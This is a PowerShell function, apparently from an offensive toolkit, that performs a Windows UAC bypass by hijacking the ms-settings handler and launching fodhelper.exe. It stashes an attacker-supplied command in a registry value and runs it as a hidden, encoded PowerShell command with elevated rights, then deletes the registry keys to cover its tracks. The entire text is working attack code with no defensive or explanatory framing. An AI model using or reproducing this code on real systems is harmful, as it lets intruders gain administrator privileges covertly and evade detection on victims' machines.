function FodhelperBypass{ 
 Param ([String]$comando)

    New-Item -path registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\Update -force | Out-Null
    Set-ItemProperty -path registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\Update -name 'Update' -Value $comando -Force | Out-Null
    $comando = 'powershell.exe -NoP -NonI -c $x=$((gp HKCU:Software\Microsoft\Windows\Update).Update); powershell -NoP -NonI -W Hidden -enc $x'
    

    #Create registry structure
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $comando -Force | Out-Null

    #Perform the bypass
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

    #Remove registry structure
    Start-Sleep 3
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force

}	
